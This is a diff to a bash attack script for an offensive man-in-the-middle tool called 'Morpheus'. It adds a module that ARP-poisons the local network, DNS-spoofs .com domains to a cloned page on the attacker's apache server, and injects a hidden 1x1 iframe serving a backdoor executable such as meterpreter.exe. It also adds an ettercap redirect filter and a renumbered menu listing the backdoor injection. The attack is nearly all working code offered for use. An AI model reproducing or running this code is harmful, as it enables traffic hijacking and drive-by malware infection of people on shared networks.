@@ -129,6 +129,7 @@ LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev
 IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
 Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
 Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
+ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1 # apache2 webroot
 
 
 
@@ -300,7 +301,6 @@ sleep 2
 # run module?
 rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
@@ -313,15 +313,22 @@ fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: $IP\nWARNING
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.bk > /dev/null 2>&1 # backup
   cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.bk > /dev/null 2>&1 # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|TaRgEt|$fil_one|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  # using SED bash command to config redirect.eft
+  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
   cd $IPATH
   sleep 1
 
-
+# compiling packet_drop.eft to be used in ettercap
+xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
+echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
+sleep 1
+xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
@@ -353,8 +360,99 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  rm $IPATH/output/redirect.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.bk $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $IPATH/filters/redirect.bk $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
+  cd $IPATH
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+# --------------------------------------------------------
+# CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
+# --------------------------------------------------------
+sh_stage3 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}  This module will ask user to input an website (domain name)     ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  to clone then will inject one iframe with one backdoor embbebed ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the cloned webpage'   ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+dIc=$(zenity --title="☠ BACKDOOR AGENT NAME ☠" --text "example:meterpreter.exe\nUpload malicious executable to apache2 and input is name" --entry --width 270) > /dev/null 2>&1
+
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sleep 1
+  # backup all files needed.
+  cd $IPATH/bin
+  cp $IPATH/bin/etter.dns etter.bk # backup (NO dev/null to report file not existence)
+  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  # using bash SED to inject our malicious <iframe>
+  sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > index.html
+  # copy files to apache2 webroot
+  mv index.html $ApachE/index.html > /dev/null 2>&1
+  cp googlelogo_white_background_color_272x92dp.png $ApachE > /dev/null 2>&1
+  # use SED bash command to config our etter.dns
+  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
+  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  cd $IPATH
+  sleep 1
+
+echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  mv $IPATH/bin/etter.bk $IPATH/bin/etter.dns > /dev/null 2>&1
+  rm $ApachE/googlelogo_white_background_color_272x92dp.png > /dev/null 2>&1
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -372,7 +470,7 @@ fi
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage3 () {
+sh_stage4 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -738,12 +836,12 @@ cat << !
     ╠────────╩──────────────────────────────────────────────────────────╣
     |   1    -  Drop all packets from/to target  [ packets drop,kill  ] |
     |   2    -  Redirect browser traffic         [ to another domain  ] |
-    |   3    -  Replace website images           [ img src=http://www ] |
-    |   4    -  Replace website text             [ replace: worlds    ] |
-    |   5    -  https downgrade attack demo      [ replace: https     ] |
-    |   6    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
-    |   7    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |   8    -  Inject backdoor into </title>    [ meterpreter.exe    ] |
+    |   3    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
+    |   4    -  Replace website images           [ img src=http://www ] |
+    |   5    -  Replace website text             [ replace: worlds    ] |
+    |   6    -  https downgrade attack demo      [ replace: https     ] |
+    |   7    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
+    |   8    -  Rotate website document 180º     [ CSS3 injection     ] |
     |   9    -  firewall filter tcp/udp          [report/capture_creds] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
@@ -761,6 +859,7 @@ case $choice in
 1) sh_stage1 ;;
 2) sh_stage2 ;;
 3) sh_stage3 ;;
+4) sh_stage4 ;;
 9) sh_stage9 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
